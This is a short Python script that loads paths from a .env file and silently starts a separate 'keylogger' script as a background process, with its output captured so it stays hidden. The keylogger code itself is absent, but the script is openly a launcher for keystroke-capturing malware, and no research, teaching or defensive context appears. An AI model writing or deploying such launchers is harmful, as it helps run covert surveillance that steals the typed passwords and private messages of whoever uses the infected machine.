import os
import subprocess
from dotenv import load_dotenv

# Load the environment variables from the .env file
load_dotenv()

# Retrieve the python path and keylogger path from the environment
python_path = os.environ.get('PYTHON_PATH')
keylogger_path = os.environ.get('KEYLOGGER_PATH')

# Execute the keylogger script in the background
subprocess.Popen([python_path, keylogger_path],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
